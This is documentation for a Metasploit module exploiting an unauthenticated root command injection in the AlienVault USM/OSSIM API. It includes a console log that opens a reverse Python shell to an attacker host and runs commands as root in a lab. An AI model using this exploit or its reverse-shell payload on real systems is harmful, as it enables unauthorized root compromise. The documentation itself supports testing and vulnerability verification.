## Vulnerable Application

This module exploits a command injection vulnerability in the Alienvault USM/OSSIM API. It allows an unauthenticated user to execute arbitrary commands as root. The vulnerable code was introduced in version 5.3.4 and fixed in 5.3.6.

This module was tested against AlienVault USM 5.3.5

**Vulnerable Application Installation Steps**

Alienvault recently took down their download repository, which allowed users to download older versions. Unfortunately, all they now offer is the latest version for download unless you're a paying customer that has access to older releases. If you can find a mirror with 5.3.4 or 5.3.5 then a default installation of either of those will work for testing.

## Verification Steps

Below is an example of a successful exploit:

```
msf > use exploit/linux/http/alienvault_api_exec 
msf exploit(alienvault_api_exec) > set RHOST 192.168.56.102
RHOST => 192.168.56.102
msf exploit(alienvault_api_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf exploit(alienvault_api_exec) > set LHOST 192.168.56.101
LHOST => 192.168.56.101
msf exploit(alienvault_api_exec) > check
[+] 192.168.56.102:40011 The target is vulnerable.
msf exploit(alienvault_api_exec) > run

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Executing payload...
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:51696) at 2017-04-13 12:30:20 -0400

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux VirtualUSMAllInOne 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
tail /etc/issue
=========================================================================
===================== http://www.alienvault.com  ========================
=========================================================================
====  Access the AlienVault web interface using the following URL:  =====
                         https://192.168.56.102/
=========================================================================


AlienVault USM 5.3.5 - \m - \l

```